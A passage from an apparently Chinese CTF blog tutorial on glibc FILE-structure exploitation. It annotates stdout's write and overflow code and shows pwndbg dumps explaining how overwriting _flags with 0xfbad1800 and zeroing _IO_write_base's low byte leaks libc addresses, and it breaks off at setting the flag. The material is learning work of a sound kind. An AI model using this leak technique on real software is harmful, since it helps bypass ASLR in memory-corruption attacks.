&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">	count = to_do;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      <span class="built_in">memcpy</span> (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      f-&gt;_IO_write_ptr += count;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      s += count;</span><br><span class="line">      to_do -= count;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_size_t block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line"><span class="comment">//用它来刷新缓冲区，刷新缓冲区也就会输出</span></span><br></pre></td></tr></table></figure>

<p>这个<code>_IO_OVERFLOW</code>也是虚表函数，它实际调用的是<code>_IO_new_file_overflow</code></p>
<h3 id="IO-new-file-overflow"><a href="#IO-new-file-overflow" class="headerlink" title="_IO_new_file_overflow"></a>_IO_new_file_overflow</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_overflow (_IO_FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//flags不能包含_IO_NO_WRITES标志位0x8，否则就会执行这里的报错</span></span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="comment">//这里若满足这两个条件之一就会执行下面这一大串代码，很有可能会报错</span></span><br><span class="line">  <span class="comment">//所以我们设置flags中_IO_CURRENTLY_PUTTING标志位为1，就可以跳过这一大段代码</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)<span class="comment">//</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_doallocbuf (f);</span><br><span class="line">	  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">	 logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">	 read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">	 makes room for subsequent output.</span></span><br><span class="line"><span class="comment">	 Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">	 alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">	  _IO_free_backup_area (f);</span><br><span class="line">	  f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">				   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">	  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">	f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">	f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//在这里我们要关注这个 _IO_do_write,调整到_Io_new_do_write</span></span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">			 f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">    <span class="comment">//这里_IO_do_write输出了f-&gt;_IO_write_ptr - f-&gt;_IO_write_base中间的值</span></span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">		      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) ch;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)</span><br></pre></td></tr></table></figure>

<h3 id="IO-new-do-write"><a href="#IO-new-do-write" class="headerlink" title="_IO_new_do_write()"></a>_IO_new_do_write()</h3><p>跳转到<code>_IO_new_do_write</code>，如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_do_write (_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">	  || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;<span class="comment">//这里也就是io_do_erite调用了new_do_write进行写出</span></span><br><span class="line">libc_hidden_ver (_IO_new_do_write, _IO_do_write)</span><br><span class="line"><span class="comment">//new_do_write</span></span><br><span class="line"><span class="type">static</span></span><br><span class="line">_IO_size_t</span><br><span class="line"><span class="title function_">new_do_write</span> <span class="params">(_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span></span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">    <span class="comment">//首先检查了flags中_IO_IS_APPENDING标志位，0x1000处</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_off64_t new_pos</span><br><span class="line">	= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);<span class="comment">//这里就能实现输出f-&gt;_IO_write_ptr - f-&gt;_IO_write_base</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">		       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">		       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="test"><a href="#test" class="headerlink" title="test"></a>test</h3><p>随便运行一个程序，用gdb调试：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/32gx &amp;_IO_2_1_stdout_</span><br><span class="line">0x7ffff7dd2620 &lt;_IO_2_1_stdout_&gt;:       0x00000000fbad2887      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2630 &lt;_IO_2_1_stdout_+16&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2640 &lt;_IO_2_1_stdout_+32&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2650 &lt;_IO_2_1_stdout_+48&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2660 &lt;_IO_2_1_stdout_+64&gt;:    0x00007ffff7dd26a4      0x0000000000000000</span><br><span class="line">0x7ffff7dd2670 &lt;_IO_2_1_stdout_+80&gt;:    0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2680 &lt;_IO_2_1_stdout_+96&gt;:    0x0000000000000000      0x00007ffff7dd18e0</span><br><span class="line">0x7ffff7dd2690 &lt;_IO_2_1_stdout_+112&gt;:   0x0000000000000001      0xffffffffffffffff</span><br><span class="line">0x7ffff7dd26a0 &lt;_IO_2_1_stdout_+128&gt;:   0x000000000a000000      0x00007ffff7dd3780</span><br><span class="line">0x7ffff7dd26b0 &lt;_IO_2_1_stdout_+144&gt;:   0xffffffffffffffff      0x0000000000000000</span><br><span class="line">0x7ffff7dd26c0 &lt;_IO_2_1_stdout_+160&gt;:   0x00007ffff7dd17a0      0x0000000000000000</span><br><span class="line">0x7ffff7dd26d0 &lt;_IO_2_1_stdout_+176&gt;:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd26e0 &lt;_IO_2_1_stdout_+192&gt;:   0x00000000ffffffff      0x0000000000000000</span><br><span class="line">0x7ffff7dd26f0 &lt;_IO_2_1_stdout_+208&gt;:   0x0000000000000000      0x00007ffff7dd06e0</span><br><span class="line">0x7ffff7dd2700 &lt;stderr&gt;:        0x00007ffff7dd2540      0x00007ffff7dd2620</span><br><span class="line">0x7ffff7dd2710 &lt;stdin&gt;: 0x00007ffff7dd18e0      0x00007ffff7a2db80</span><br><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus *)0x7ffff7dd2620</span><br><span class="line"><span class="variable">$1</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72537977,</span><br><span class="line">    _IO_read_ptr = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_read_end = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_read_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_ptr = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    <span class="comment">#正常情况下_IO_write_base和_IO_write_ptr是相等的</span></span><br><span class="line">    _IO_write_end = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_buf_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_buf_end = 0x7ffff7dd26a4 &lt;_IO_2_1_stdout_+132&gt; <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;,</span><br><span class="line">    _fileno = 1,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = -1,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 <span class="string">&#x27;\000&#x27;</span>,</span><br><span class="line">    _shortbuf = <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _lock = 0x7ffff7dd3780 &lt;_IO_stdfile_1_lock&gt;,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x7ffff7dd17a0 &lt;_IO_wide_data_1&gt;,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = -1,</span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats 19 <span class="built_in">times</span>&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看一下_IO_write_base &#x3D; 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt;</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/32gx 0x7ffff7dd26a3</span><br><span class="line">0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt;:   0xdd3780000000000a      0xffffff00007ffff7</span><br><span class="line">0x7ffff7dd26b3 &lt;_IO_2_1_stdout_+147&gt;:   0x000000ffffffffff      0xdd17a00000000000</span><br><span class="line">0x7ffff7dd26c3 &lt;_IO_2_1_stdout_+163&gt;:   0x00000000007ffff7      0x0000000000000000</span><br><span class="line">0x7ffff7dd26d3 &lt;_IO_2_1_stdout_+179&gt;:   0x0000000000000000      0xffffff0000000000</span><br><span class="line">0x7ffff7dd26e3 &lt;_IO_2_1_stdout_+195&gt;:   0x00000000000000ff      0x0000000000000000</span><br><span class="line">0x7ffff7dd26f3 &lt;_IO_2_1_stdout_+211&gt;:   0xdd06e00000000000      0xdd254000007ffff7</span><br><span class="line">0x7ffff7dd2703 &lt;stderr+3&gt;:      0xdd262000007ffff7      0xdd18e000007ffff7</span><br><span class="line">0x7ffff7dd2713 &lt;stdin+3&gt;:       0xa2db8000007ffff7      0x00000000007ffff7</span><br><span class="line">0x7ffff7dd2723 &lt;map+3&gt;: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2733 &lt;__printf_arginfo_table+3&gt;:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2743 &lt;buf+3&gt;: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2753 &lt;buffer+3&gt;:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2763 &lt;buffer+3&gt;:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2773 &lt;buffer+3&gt;:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2783 &lt;buffer+3&gt;:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2793 &lt;ttyname_buf+3&gt;: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>若我们通过低字节覆盖，将它低字节覆盖为<code>\x00</code>，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/32gx 0x7ffff7dd2600</span><br><span class="line">0x7ffff7dd2600 &lt;_IO_2_1_stderr_+192&gt;:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2610 &lt;_IO_2_1_stderr_+208&gt;:   0x0000000000000000      0x00007ffff7dd06e0#这里包含了libc中的值</span><br><span class="line">0x7ffff7dd2620 &lt;_IO_2_1_stdout_&gt;:       0x00000000fbad2887      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2630 &lt;_IO_2_1_stdout_+16&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2640 &lt;_IO_2_1_stdout_+32&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2650 &lt;_IO_2_1_stdout_+48&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2660 &lt;_IO_2_1_stdout_+64&gt;:    0x00007ffff7dd26a4      0x0000000000000000</span><br><span class="line">0x7ffff7dd2670 &lt;_IO_2_1_stdout_+80&gt;:    0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2680 &lt;_IO_2_1_stdout_+96&gt;:    0x0000000000000000      0x00007ffff7dd18e0</span><br><span class="line">0x7ffff7dd2690 &lt;_IO_2_1_stdout_+112&gt;:   0x0000000000000001      0xffffffffffffffff</span><br><span class="line">0x7ffff7dd26a0 &lt;_IO_2_1_stdout_+128&gt;:   0x000000000a000000      0x00007ffff7dd3780</span><br><span class="line">0x7ffff7dd26b0 &lt;_IO_2_1_stdout_+144&gt;:   0xffffffffffffffff      0x0000000000000000</span><br><span class="line">0x7ffff7dd26c0 &lt;_IO_2_1_stdout_+160&gt;:   0x00007ffff7dd17a0      0x0000000000000000</span><br><span class="line">0x7ffff7dd26d0 &lt;_IO_2_1_stdout_+176&gt;:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd26e0 &lt;_IO_2_1_stdout_+192&gt;:   0x00000000ffffffff      0x0000000000000000</span><br><span class="line">0x7ffff7dd26f0 &lt;_IO_2_1_stdout_+208&gt;:   0x0000000000000000      0x00007ffff7dd06e0</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>它就会根据<code>f-&gt;_IO_write_ptr - f-&gt;_IO_write_base</code>来输出从&lt;_IO_2_1_stderr_+192&gt;到 &lt;_IO_2_1_stdout_+131&gt;中间的内容</p>
<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>所以我们要泄露地址，首先要将 <code>io_file</code> 的 <code>_IO_CURRENTLY_PUTTING</code> 置 1，<code>_IO_IS_APPENDING</code> 0x1000 置 1，以及 <code>_IO_NO_WRITES</code> 0x8 不要为 1，就可以进行地址泄露了，一般可以覆盖为 <code>0xfbad1800</code>，就可以泄露 <code>write_base</code> 和 <code>write_ptr</code> 之间的值，随便运行个程序，我们可以看到这里，可以看到 <code>write_base</code> 和 <code>write_ptr</code> 都是 <code>libc</code>。</p>
<p><strong>deepseek解释0xfbad1800:</strong></p>
<p>在 <code>_flags</code> 字段 <code>0xfbad1800</code> 中，<code>0x1000</code> 和 <code>0x8</code> 对应的二进制位如下：</p>
<ol>
<li><strong>标志位解析</strong>：</li>
</ol>
<ul>
<li><p><strong><code>_IO_IS_APPENDING</code>（0x1000）</strong>：</p>
<ul>
<li><strong>位位置</strong>：第 <strong>12 位</strong>（从 0 开始计数）。</li>
<li><strong>在 <code>0xfbad1800</code> 中的状态</strong>：<br><code>0xfbad1800 &amp; 0x1000 = 0x1000</code>，说明该位被设置为 <strong>1</strong>。</li>
<li><strong>作用</strong>：表示文件流处于追加模式（<code>append</code>），允许写入时自动定位到文件末尾。</li>
</ul>
</li>
<li><p><strong><code>_IO_NO_WRITES</code>（0x8）</strong>：</p>
<ul>
<li><strong>位位置</strong>：第 <strong>3 位</strong>。</li>
<li><strong>在 <code>0xfbad1800</code> 中的状态</strong>：<br><code>0xfbad1800 &amp; 0x8 = 0</code>，说明该位被设置为 <strong>0</strong>。</li>
<li><strong>作用</strong>：允许写入操作（若为 1 则禁止写入）。</li>
</ul>
</li>
</ul>
<ol start="2">
<li><strong><code>0xfbad1800</code> 的二进制分解</strong>：</li>
</ol>
<p>将 <code>0xfbad1800</code> 转换为 32 位二进制：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1111 1011 1010 1101 0001 1000 0000 0000</span><br><span class="line">                       ^            ^</span><br><span class="line">                       |           |</span><br><span class="line">                       |           +-- 第 3 位 (0x8)：0</span><br><span class="line">                       +-- 第 12 位 (0x1000)：1</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><strong>其他关键标志</strong>：</li>
</ol>
<ul>
<li><p><strong><code>_IO_CURRENTLY_PUTTING</code>（0x800）</strong>：</p>
<ul>
<li><strong>位位置</strong>：第 <strong>11 位</strong>。</li>
<li><strong>在 <code>0xfbad1800</code> 中的状态</strong>：<br><code>0xfbad1800 &amp; 0x800 = 0x800</code>，说明该位被设置为 <strong>1</strong>。</li>
<li><strong>作用</strong>：表示当前正在进行输出操作（<code>put</code>）。</li>
</ul>
</li>
<li><p><strong><code>_IO_MAGIC</code>（0xfbad0000）</strong>：</p>
<ul>
<li><strong>高 16 位</strong>：<code>0xfbad</code>，标识这是一个合法的 <code>FILE</code> 结构。</li>
</ul>
</li>
</ul>
<ol start="4">
<li><strong>总结</strong>：</li>
</ol>
<ul>
<li><strong><code>0xfbad1800</code> 的位设置</strong>：<ul>
<li><strong>第 12 位（0x1000）</strong>：1（允许追加模式）。</li>
<li><strong>第 3 位（0x8）</strong>：0（允许写入操作）。</li>
<li><strong>第 11 位（0x800）</strong>：1（正在写入）。</li>
</ul>
</li>
</ul>
<p>通过覆盖 <code>_flags</code> 为 <code>0xfbad1800</code>，可以满足以下条件：</p>
<ol>
<li>启用 <code>_IO_IS_APPENDING</code> 和 <code>_IO_CURRENTLY_PUTTING</code>。</li>
<li>禁用 <code>_IO_NO_WRITES</code>，从而允许地址泄露。</li>
</ol>
<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>随便找一个输出菜单有puts的堆题，直接gdb运行起来</p>
<p>第一步，通过<code>x/32gx &amp;_IO_2_1_stdout_</code>来查看 stdout 的位置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/32gx &amp;_IO_2_1_stdout_</span><br><span class="line">0x7ffff7dd2620 &lt;_IO_2_1_stdout_&gt;:       0x00000000fbad2887      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2630 &lt;_IO_2_1_stdout_+16&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2640 &lt;_IO_2_1_stdout_+32&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2650 &lt;_IO_2_1_stdout_+48&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2660 &lt;_IO_2_1_stdout_+64&gt;:    0x00007ffff7dd26a4      0x0000000000000000</span><br><span class="line">0x7ffff7dd2670 &lt;_IO_2_1_stdout_+80&gt;:    0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2680 &lt;_IO_2_1_stdout_+96&gt;:    0x0000000000000000      0x00007ffff7dd18e0</span><br><span class="line">0x7ffff7dd2690 &lt;_IO_2_1_stdout_+112&gt;:   0x0000000000000001      0xffffffffffffffff</span><br><span class="line">0x7ffff7dd26a0 &lt;_IO_2_1_stdout_+128&gt;:   0x000000000a000000      0x00007ffff7dd3780</span><br><span class="line">0x7ffff7dd26b0 &lt;_IO_2_1_stdout_+144&gt;:   0xffffffffffffffff      0x0000000000000000</span><br><span class="line">0x7ffff7dd26c0 &lt;_IO_2_1_stdout_+160&gt;:   0x00007ffff7dd17a0      0x0000000000000000</span><br><span class="line">0x7ffff7dd26d0 &lt;_IO_2_1_stdout_+176&gt;:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd26e0 &lt;_IO_2_1_stdout_+192&gt;:   0x00000000ffffffff      0x0000000000000000</span><br><span class="line">0x7ffff7dd26f0 &lt;_IO_2_1_stdout_+208&gt;:   0x0000000000000000      0x00007ffff7dd06e0</span><br><span class="line">0x7ffff7dd2700 &lt;stderr&gt;:        0x00007ffff7dd2540      0x00007ffff7dd2620</span><br><span class="line">0x7ffff7dd2710 &lt;stdin&gt;: 0x00007ffff7dd18e0      0x00007ffff7a2db80</span><br></pre></td></tr></table></figure>

<p>第二步，通过<code>p *(struct _IO_FILE_plus*)0x7ffff7dd2620</code>查看它的结构体信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus*)0x7ffff7dd2620</span><br><span class="line"><span class="variable">$1</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72537977,</span><br><span class="line">    _IO_read_ptr = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_read_end = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_read_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_ptr = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_end = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_buf_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_buf_end = 0x7ffff7dd26a4 &lt;_IO_2_1_stdout_+132&gt; <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;,</span><br><span class="line">    _fileno = 1,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = -1,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 <span class="string">&#x27;\000&#x27;</span>,</span><br><span class="line">    _shortbuf = <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _lock = 0x7ffff7dd3780 &lt;_IO_stdfile_1_lock&gt;,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x7ffff7dd17a0 &lt;_IO_wide_data_1&gt;,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = -1,</span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats 19 <span class="built_in">times</span>&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第三步，设置flag值</p>
